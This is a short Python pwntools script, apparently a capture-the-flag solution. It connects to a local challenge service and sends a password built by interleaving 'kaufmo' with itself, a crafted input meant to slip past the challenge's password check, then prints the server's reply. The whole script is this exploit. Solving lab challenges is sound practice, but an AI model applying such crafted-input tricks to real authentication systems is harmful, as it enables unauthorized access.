from pwn import *
if __name__ == "__main__":
    #p = process("./chall.py")
    p = remote("127.0.0.1", 2023)
    pass_w = "kaufmo"
    pass_smuggling = ''.join([i+pass_w for i in pass_w])
    p.recv()
    p.sendline(pass_smuggling.encode())
    print(p.recv().decode())
